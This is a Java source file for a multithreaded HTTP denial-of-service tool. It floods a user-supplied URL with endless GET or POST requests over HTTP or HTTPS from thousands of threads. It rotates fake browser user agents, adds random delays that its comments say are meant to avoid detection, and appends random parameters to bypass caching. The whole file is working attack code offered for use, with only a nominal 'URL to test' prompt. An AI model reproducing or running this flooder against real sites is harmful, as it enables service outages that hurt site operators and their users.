import java.io.*;
import java.net.*;
import java.util.ArrayList;
import java.util.Random;
import java.util.Scanner;
import javax.net.ssl.HttpsURLConnection;

public class Dos implements Runnable {

    private static final String[] USER_AGENTS = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 10; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36"
    };

    private static int amount = 0;
    private static String url = "";
    private int seq;
    private int type;
    private Random random = new Random();

    public Dos(int seq, int type) {
        this.seq = seq;
        this.type = type;
    }

    public void run() {
        try {
            while (true) {
                switch (this.type) {
                    case 1:
                        postAttack(Dos.url);
                        break;
                    case 2:
                        sslPostAttack(Dos.url);
                        break;
                    case 3:
                        getAttack(Dos.url);
                        break;
                    case 4:
                        sslGetAttack(Dos.url);
                        break;
                }
                // Random delay between requests to avoid detection
                Thread.sleep(random.nextInt(500)); // delay between 0 to 500 ms
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) throws Exception {
        Scanner in = new Scanner(System.in);
        System.out.print("Enter URL to test: ");
        url = in.nextLine();

        String[] SUrl = url.split("://");
        Dos dos = new Dos(0, 0);
        
        System.out.print("Thread amount: ");
        String inputAmount = in.nextLine();
        Dos.amount = (inputAmount.isEmpty()) ? 2000 : Integer.parseInt(inputAmount);

        System.out.print("Method (get/post): ");
        String option = in.nextLine().toLowerCase();
        int ioption = (option.equals("get")) ? ((SUrl[0].equals("http")) ? 3 : 4) : ((SUrl[0].equals("http")) ? 1 : 2);

        System.out.println("Starting attack with " + Dos.amount + " threads...");
        ArrayList<Thread> threads = new ArrayList<>();
        for (int i = 0; i < Dos.amount; i++) {
            Thread t = new Thread(new Dos(i, ioption));
            t.start();
            threads.add(t);
        }

        for (Thread t : threads) {
            t.join();
        }
        System.out.println("Attack complete.");
    }

    private void getAttack(String url) throws Exception {
        URL obj = new URL(url + "?rand=" + random.nextInt(1000)); // Random param to bypass caching
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENTS[random.nextInt(USER_AGENTS.length)]);

        int responseCode = con.getResponseCode();
        System.out.println("GET attack: " + responseCode + " Thread: " + this.seq);
    }

    private void sslGetAttack(String url) throws Exception {
        URL obj = new URL(url + "?rand=" + random.nextInt(1000));
        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
        con.setRequestMethod("GET");
        con.setRequestProperty("User-Agent", USER_AGENTS[random.nextInt(USER_AGENTS.length)]);

        int responseCode = con.getResponseCode();
        System.out.println("SSL GET attack: " + responseCode + " Thread: " + this.seq);
    }

    private void postAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpURLConnection con = (HttpURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        con.setRequestProperty("User-Agent", USER_AGENTS[random.nextInt(USER_AGENTS.length)]);
        con.setDoOutput(true);

        String urlParameters = "data=" + random.nextInt(1000);
        try (DataOutputStream wr = new DataOutputStream(con.getOutputStream())) {
            wr.writeBytes(urlParameters);
            wr.flush();
        }
        int responseCode = con.getResponseCode();
        System.out.println("POST attack: " + responseCode + " Thread: " + this.seq);
    }

    private void sslPostAttack(String url) throws Exception {
        URL obj = new URL(url);
        HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
        con.setRequestMethod("POST");
        con.setRequestProperty("User-Agent", USER_AGENTS[random.nextInt(USER_AGENTS.length)]);
        con.setDoOutput(true);

        String urlParameters = "data=" + random.nextInt(1000);
        try (DataOutputStream wr = new DataOutputStream(con.getOutputStream())) {
            wr.writeBytes(urlParameters);
            wr.flush();
        }
        int responseCode = con.getResponseCode();
        System.out.println("SSL POST attack: " + responseCode + " Thread: " + this.seq);
    }
}
